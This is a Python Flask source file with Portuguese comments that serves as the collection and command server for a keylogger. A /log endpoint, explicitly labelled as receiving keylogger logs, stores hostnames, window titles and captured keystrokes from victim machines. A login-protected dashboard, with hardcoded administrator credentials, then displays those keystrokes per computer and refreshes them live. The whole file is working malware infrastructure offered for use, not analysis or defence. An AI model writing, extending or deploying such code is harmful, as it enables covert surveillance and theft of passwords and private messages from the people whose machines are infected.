from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
import sqlite3, os, datetime, secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

DB = "logs.db"

# --- credenciais ---
USERNAME = "administrator"
PASSWORD = "K$9xP#2mQz!7vL4w"

def get_db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hostname TEXT NOT NULL,
                window TEXT,
                data TEXT NOT NULL,
                ts DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()

init_db()

# --- recebe log do keylogger ---
@app.route("/log", methods=["POST"])
def receive_log():
    j = request.get_json(force=True, silent=True)
    if not j:
        return jsonify({"error": "bad request"}), 400
    hostname = j.get("hostname", "unknown")
    window   = j.get("window", "")
    data     = j.get("data", "")
    if not data:
        return jsonify({"ok": True})
    with get_db() as conn:
        conn.execute("INSERT INTO logs (hostname, window, data) VALUES (?,?,?)",
                     (hostname, window, data))
        conn.commit()
    return jsonify({"ok": True})

# --- login ---
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Login</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #0e0e0e; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: monospace; }
  .box { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 40px; width: 320px; }
  h2 { color: #4ec9b0; margin-bottom: 24px; text-align: center; }
  input { width: 100%; background: #0e0e0e; border: 1px solid #444; color: #d4d4d4; padding: 10px; border-radius: 4px; margin-bottom: 14px; font-family: monospace; font-size: 14px; }
  button { width: 100%; background: #4ec9b0; color: #0e0e0e; border: none; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 14px; font-weight: bold; cursor: pointer; }
  button:hover { background: #3ab09a; }
  .err { color: #f48771; font-size: 13px; margin-bottom: 12px; text-align: center; }
</style>
</head>
<body>
<div class="box">
  <h2>🔒 Painel</h2>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <form method="POST">
    <input type="text" name="username" placeholder="usuário" autofocus>
    <input type="password" name="password" placeholder="senha">
    <button type="submit">Entrar</button>
  </form>
</div>
</body>
</html>
"""

@app.route("/login", methods=["GET","POST"])
def login():
    error = None
    if request.method == "POST":
        u = request.form.get("username","")
        p = request.form.get("password","")
        if u == USERNAME and p == PASSWORD:
            session["auth"] = True
            return redirect(url_for("panel"))
        error = "credenciais inválidas"
    return render_template_string(LOGIN_PAGE, error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# --- painel ---
PANEL = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Painel</title>
<meta http-equiv="refresh" content="10">
<style>
  body { font-family: monospace; background:#0e0e0e; color:#d4d4d4; padding:20px; }
  h1 { color:#4ec9b0; display:inline-block; }
  .logout { float:right; color:#555; text-decoration:none; font-size:13px; margin-top:8px; }
  .logout:hover { color:#f48771; }
  .pc { background:#1e1e1e; border:1px solid #333; border-radius:6px; padding:14px; margin:20px 0; }
  .pc h2 { color:#ce9178; margin:0 0 10px; }
  .entry { font-size:12px; color:#9cdcfe; margin:2px 0; }
  .window { color:#569cd6; font-weight:bold; margin-top:8px; }
  .ts { color:#555; }
  .meta { color:#555; font-size:12px; margin-bottom:20px; }
</style>
</head>
<body>
<h1>🖥 Painel de Logs</h1>
<a class="logout" href="/logout">sair</a>
<div class="meta">atualiza a cada 10s &mdash; {{ now }}</div>
{% for pc in pcs %}
<div class="pc">
  <h2>💻 {{ pc }}</h2>
  {% for row in logs[pc] %}
    {% if row['window'] %}
      <div class="window">[ {{ row['window'] }} ]</div>
    {% endif %}
    <div class="entry"><span class="ts">{{ row['ts'] }}</span> &nbsp; {{ row['data'] }}</div>
  {% endfor %}
</div>
{% endfor %}
{% if not pcs %}<p style="color:#555">nenhum dado ainda.</p>{% endif %}
</body>
</html>
"""

@app.route("/")
def panel():
    if not session.get("auth"):
        return redirect(url_for("login"))
    with get_db() as conn:
        pcs = [r[0] for r in conn.execute(
            "SELECT DISTINCT hostname FROM logs ORDER BY hostname").fetchall()]
        logs = {}
        for pc in pcs:
            rows = conn.execute(
                "SELECT window, data, ts FROM logs WHERE hostname=? ORDER BY id DESC LIMIT 200",
                (pc,)).fetchall()
            logs[pc] = [dict(r) for r in rows]
    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    return render_template_string(PANEL, pcs=pcs, logs=logs, now=now)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
